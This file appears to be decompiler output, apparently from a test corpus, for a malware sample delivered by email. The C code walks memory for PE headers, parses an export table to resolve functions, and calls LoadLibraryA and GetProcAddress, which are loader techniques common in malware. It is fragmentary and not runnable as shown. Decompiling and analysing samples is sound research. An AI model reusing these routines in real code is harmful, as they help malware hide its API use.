// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0752/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401200(Eq_9 eax, word32 ebp, Eq_5 * fs)
{
	fs->dw0000 = fp - 0x00000008;
	Eq_8 * edi_18 = DPB(eax, ax & 0x1000, 0, 16);
	while (true)
	{
		globals->dw403748 = fp - 0x00000008;
		globals->dw40374C = ebp;
		globals->ptr403750 = edi_18;
		if (edi_18->w0000 == 0x5A4D)
		{
			edi_18 = edi_18 + Mem23[edi_18 + 0x0000003C:word32];
			if (edi_18->w0000 == 0x4550)
			{
				fs->dw0000 = dwLoc0C;
				return;
			}
		}
l00401252:
		edi_18 = edi_18 - 0x00001000;
	}
}

word32 fn0040126E(Eq_45 * esi, Eq_49 * edi)
{
	word32 edx_15 = 0x00000000;
	while (true)
	{
		esi_20 = esi;
		do
		{
			Eq_45 * esi_20;
			if (esi_41->b0000 == 0x00)
				return edx_15;
			esi_20 = esi_41 + 0x00000001;
			edi = edi_40 + 0x00000001;
			Eq_49 * edi_40 = edi;
			Eq_45 * esi_41 = esi_20;
		} while (esi_41->b0000 == edi_40->b0000);
		do
		{
			edi = edi_42 + 0x00000001;
			Eq_49 * edi_42 = edi;
		} while (0x00 != edi_42->b0000);
		edx_15 = edx_15 + 0x00000001;
	}
}

byte fn00401286(Eq_9 eax, Eq_9 ebx)
{
	Mem0[0x004081C6:word32]();
	if (eax == 0xFFFFFFFE)
		ebx = globals->t4020F5;
	word32 ebp_28 = Mem0[ebx + Mem0[ebx + 0x0000003C:word32] + 0x00000078:word32] + ebx;
	word32 eax_44 = Mem0[ebp_28 + 0x00000024:word32] + ebx + 0x00000002 + fn0040126E(&globals->t4020F5, Mem0[Mem0[ebp_28 + 0x00000020:word32] + ebx:word32] + ebx) * 0x00000002 - Mem0[ebp_28 + 0x00000010:word32] * 0x00000002;
	word32 eax_51 = (Mem0[ebp_28 + 0x0000001C:word32] + ebx)[(DPB(eax_44, Mem0[eax_44 + 0x00000000:word16], 0, 16) & 0x0000FFFF) * 0x00000004] + ebx;
	globals->t4020F5 = eax_51;
	return (byte) eax_51;
}

void fn004012E6(word32 * ecx, word32 edx, word32 ebx, word32 ebp, Eq_5 * fs)
{
	fn004012EC(ecx, edx, ebx, ebp, fs);
}

void fn004012EC(word32 * ecx, word32 edx, word32 ebx, word32 ebp, Eq_5 * fs)
{
	fn004012F3();
	Eq_9 ebx_4 = ebx + ebp;
	fn004012F4(ecx, edx, ebx_4, ebp, fs);
	return;
}

void fn004012F3()
{
fn004012F3_entry:
l004012F3:
fn004012F3_exit:
}

void fn004012F4(word32 * ecx, word32 edx, Eq_9 ebx, word32 ebp, Eq_5 * fs)
{
	esp = fp;
	v5 = *ecx + edx;
	*ecx = v5;
	SCZO = cond(v5);
	fn004012F6(ebx, ebp, fs);
	return;
}

void fn004012F6(Eq_9 ebx, word32 ebp, Eq_5 * fs)
{
fn004012F6_entry:
l004012F6:
	globals->t4020F5 = LoadLibraryA(0x00402072);
	globals->t4081C6 = GetProcAddress(globals->t4020F5, 0x00402048);
	Eq_9 eax_13 = globals->t4081C6
	fn00401200(eax_13, ebp, fs)
	globals->t4020F5 = eax_13;
	Mem17[0x004081C6:word32]()
l00401333:
	branch eax_13 != 0xFFFFFFFE l00401333
l00401336:
	fn00401286(eax_13, ebx)
	fp->dwFFFFFFFC = 0xFBEFFF7F;
l00401351:
fn004012F6_exit:
}

